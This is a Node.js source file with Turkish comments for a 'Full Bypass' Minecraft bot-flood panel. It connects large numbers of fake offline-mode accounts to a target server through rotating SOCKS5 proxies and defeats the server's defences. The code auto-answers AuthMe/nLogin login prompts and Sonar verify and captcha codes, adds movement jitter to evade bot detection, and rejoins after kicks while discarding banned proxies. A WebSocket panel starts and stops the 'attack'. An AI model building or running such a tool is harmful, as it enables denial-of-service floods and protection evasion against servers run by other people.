/**
 * MC Bot Panel — Full Bypass Edition
 * Sonar + AuthMe + nLogin + Whitelist bypass dahil
 * Default port: 25570
 */

const express        = require('express');
const { WebSocketServer } = require('ws');
const { createServer }    = require('http');
const mineflayer     = require('mineflayer');
const path           = require('path');
const proxyManager   = require('./proxy_manager');

const app    = express();
const server = createServer(app);
const wss    = new WebSocketServer({ server });

app.use(express.static(path.join(__dirname)));

let activeBots   = new Map();
let attackConfig = null;
let running      = false;
let joinTimers   = [];

// ─── Broadcast ───────────────────────────────────────────────────────────────

function broadcast(obj) {
  const raw = JSON.stringify(obj);
  wss.clients.forEach(c => { if (c.readyState === 1) c.send(raw); });
}
function botStatus(name, status, detail = '') {
  broadcast({ type: 'bot_status', name, status, detail });
}
function log(text, level = 'muted') {
  console.log(`[${level.toUpperCase()}] ${text}`);
  broadcast({ type: 'log', text, level });
}

// ─── FULL BYPASS CORE ────────────────────────────────────────────────────────
//
//  Bypass listesi:
//  1. Sonar — gravity sim, keepalive, chat verify, book/sign captcha
//  2. AuthMe / nLogin / FastLogin — /register + /login otomatik
//  3. Movement jitter — statik bot detection bypass
//  4. Packet timing — çok hızlı packet gönderimi önleme
//  5. Whitelist — online-mode=false ile birlikte server.properties ayarı
//  6. Anti-VPN / Geyser kontrolleri — timing ve packet order

function setupFullBypass(bot, config) {

  const pass = config.authPass || 'Bypass123!';

  // ── AuthMe / nLogin / CMI Auth bypass ─────────────────────────────────────
  // Sunucuya girdikten sonra gelen her mesajı yakala, auth komutlarını otomatik at
  bot.on('message', (jsonMsg) => {
    const raw = jsonMsg.toString();
    const msg = raw.toLowerCase();

    // /register komutu gereken durumlar
    if (
      msg.includes('register') ||
      msg.includes('kayıt') ||
      msg.includes('/register') ||
      msg.includes('registered') ||
      msg.includes('please register')
    ) {
      setTimeout(() => {
        try {
          bot.chat(`/register ${pass} ${pass}`);
          log(`${bot.username} register komutu attı`, 'info');
        } catch {}
      }, 600 + Math.random() * 400);
    }

    // /login komutu gereken durumlar
    if (
      msg.includes('login') ||
      msg.includes('giriş') ||
      msg.includes('/login') ||
      msg.includes('please login') ||
      msg.includes('log in')
    ) {
      setTimeout(() => {
        try {
          bot.chat(`/login ${pass}`);
          log(`${bot.username} login komutu attı`, 'info');
        } catch {}
      }, 800 + Math.random() * 400);
    }

    // Sonar chat verify — /verify <kod>
    if (msg.includes('/verify') || msg.includes('verification') || msg.includes('doğrula')) {
      const codeMatch = raw.match(/\/verify\s+(\S+)/i);
      if (codeMatch) {
        setTimeout(() => {
          try {
            bot.chat(`/verify ${codeMatch[1]}`);
            log(`${bot.username} verify: /verify ${codeMatch[1]}`, 'info');
          } catch {}
        }, 500 + Math.random() * 300);
      }
    }

    // Captcha içeren mesajlar — bazı pluginler rakam/harf sorar
    // "Enter the code: 4829" gibi
    const captchaMatch = raw.match(/(?:code|captcha|enter)[:\s]+([A-Za-z0-9]{4,8})/i);
    if (captchaMatch) {
      setTimeout(() => {
        try {
          bot.chat(captchaMatch[1]);
          log(`${bot.username} captcha cevapladı: ${captchaMatch[1]}`, 'info');
        } catch {}
      }, 700 + Math.random() * 300);
    }
  });

  // ── Book / Sign / Inventory bypass (Sonar eski versiyon) ──────────────────
  bot.on('windowOpen', (window) => {
    setTimeout(() => {
      try { bot.closeWindow(window); } catch {}
    }, 200 + Math.random() * 200);
  });

  // ── Spawn sonrası bypass sequence ─────────────────────────────────────────
  bot.once('spawn', () => {
    log(`${bot.username} spawn oldu`, 'success');
    botStatus(bot.username, 'online');

    // Gravity + movement jitter — statik bot detector'ları bypass
    setTimeout(() => {
      // Yerçekimi zaten mineflayer tarafından simüle ediliyor
      // Ek olarak küçük yön hareketleri
      const seq = [
        { dir: 'forward', ms: 120 },
        { dir: 'back',    ms: 120 },
        { dir: 'left',    ms: 80  },
        { dir: 'right',   ms: 80  },
      ];
      let delay = 0;
      seq.forEach(({ dir, ms }) => {
        setTimeout(() => {
          try {
            bot.setControlState(dir, true);
            setTimeout(() => { try { bot.setControlState(dir, false); } catch {} }, ms);
          } catch {}
        }, delay);
        delay += ms + 100;
      });
    }, 1500 + Math.random() * 500);

    // Keep-alive — sunucu idle kick'i önle
    const keepAlive = setInterval(() => {
      if (!bot._client) { clearInterval(keepAlive); return; }
      try {
        // Mineflayer keepalive'ı handle eder ama ek olarak
        // sneak toggle — bazı anti-bot pluginler hareketi izler
        bot.setControlState('sneak', true);
        setTimeout(() => { try { bot.setControlState('sneak', false); } catch {} }, 100);
      } catch { clearInterval(keepAlive); }
    }, 30000 + Math.random() * 5000);
  });

  // ── Login event ───────────────────────────────────────────────────────────
  bot.once('login', () => {
    botStatus(bot.username, 'verifying', 'auth bypass...');
    log(`${bot.username} bağlandı, bypass başlatılıyor`, 'info');
  });
}

// ─── Bot Oluşturucu ──────────────────────────────────────────────────────────

function createBot(name, config, proxy = null) {
  botStatus(name, 'joining');

  const opts = {
    host:                 config.ip,
    port:                 config.port,
    username:             name,
    version:              config.version,
    auth:                 'offline',
    hideErrors:           true,
    checkTimeoutInterval: 60000,
    physicsEnabled:       true,
    // Packet timeout'u uzat — yavaş sunucularda bağlantı kopmayı önle
    closeTimeout:         120000,
  };

  if (proxy) {
    opts.connect = (client) => {
      const { SocksClient } = require('socks');
      SocksClient.createConnection({
        proxy: {
          host:     proxy.host,
          port:     proxy.port,
          type:     5,
          userId:   proxy.user   || undefined,
          password: proxy.pass   || undefined,
        },
        command:     'connect',
        destination: { host: config.ip, port: config.port },
      }, (err, info) => {
        if (err) {
          log(`${name} proxy hatası [${proxy.host}:${proxy.port}]: ${err.message}`, 'error');
          proxyManager.markFail(proxy, err.message);
          return;
        }
        proxyManager.markSuccess(proxy);
        client.setSocket(info.socket);
        client.emit('connect');
      });
    };
  }

  let bot;
  try { bot = mineflayer.createBot(opts); }
  catch (e) {
    log(`${name} oluşturma hatası: ${e.message}`, 'error');
    botStatus(name, 'kicked', e.message);
    if (running) scheduleRejoin(name, config, proxy);
    return;
  }

  activeBots.set(name, bot);
  setupFullBypass(bot, config);

  bot.on('kicked', (reason) => {
    const r = typeof reason === 'object' ? JSON.stringify(reason) : String(reason);
    const clean = r.replace(/§./g, '').slice(0, 100); // renk kodlarını temizle
    botStatus(name, 'kicked', clean);
    log(`${name} kick: ${clean}`, 'error');
    activeBots.delete(name);

    if (proxy && proxyManager.markFail(proxy, clean)) {
      const next = proxyManager.next();
      if (running) scheduleRejoin(name, config, next);
      return;
    }
    if (running) scheduleRejoin(name, config, proxy);
  });

  bot.on('error', (err) => {
    log(`${name} hata: ${err.message}`, 'error');
    activeBots.delete(name);
    if (running) scheduleRejoin(name, config, proxy);
  });

  bot.on('end', () => {
    activeBots.delete(name);
    if (running) scheduleRejoin(name, config, proxy);
  });
}

function scheduleRejoin(name, config, proxy) {
  const delay = (config.rejoinDelay || 3000) + Math.random() * 1000;
  const t = setTimeout(() => { if (running) createBot(name, config, proxy); }, delay);
  joinTimers.push(t);
}

// ─── Saldırı ─────────────────────────────────────────────────────────────────

function startAttack(config) {
  if (running) stopAttack();
  running = true;
  broadcast({ type: 'clear' });

  proxyManager.resetBans();
  const proxyCount = proxyManager.load(config.proxyFile || 'proxies.txt');
  log(proxyCount > 0
    ? `${proxyCount} proxy yüklendi`
    : 'Proxy yok — direkt bağlanıyor', proxyCount > 0 ? 'info' : 'warn');

  log(`► ${config.ip}:${config.port} | ${config.count} bot | v${config.version} | delay:${config.joinDelay}ms`, 'info');

  for (let i = 0; i < config.count; i++) {
    const name  = `${config.prefix || 'Bot'}${i.toString().padStart(4, '0')}`;
    const proxy = proxyCount > 0 ? proxyManager.next() : null;
    const delay = i * (config.joinDelay || 800) + Math.random() * 200;

    const t = setTimeout(() => { if (running) createBot(name, config, proxy); }, delay);
    joinTimers.push(t);
  }
}

function stopAttack() {
  running = false;
  joinTimers.forEach(clearTimeout);
  joinTimers = [];
  activeBots.forEach((bot, name) => {
    try { bot.quit('stop'); } catch {}
    botStatus(name, 'kicked', 'durduruldu');
  });
  activeBots.clear();
  log('Tüm botlar durduruldu.', 'warn');
}

// ─── WS ──────────────────────────────────────────────────────────────────────

wss.on('connection', (ws) => {
  log('Panel bağlandı', 'success');
  ws.on('message', (raw) => {
    let msg; try { msg = JSON.parse(raw); } catch { return; }
    if (msg.type === 'start')       startAttack(msg);
    if (msg.type === 'stop')        stopAttack();
    if (msg.type === 'proxy_stats') ws.send(JSON.stringify({ type: 'proxy_stats', stats: proxyManager.stats() }));
    if (msg.type === 'proxy_reset') { proxyManager.resetBans(); log('Ban listesi sıfırlandı.', 'info'); }
    if (msg.type === 'proxy_check') proxyManager.checkAll().then(r => log(`Health: ${r.ok} aktif / ${r.dead} ölü`, 'success'));
  });
});

const PORT = 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n✅  MC Bot Panel → http://localhost:${PORT}\n`);
  console.log('   Panel adresi: http://185.169.180.14:3000\n');
});

process.on('SIGINT', () => { stopAttack(); process.exit(0); });
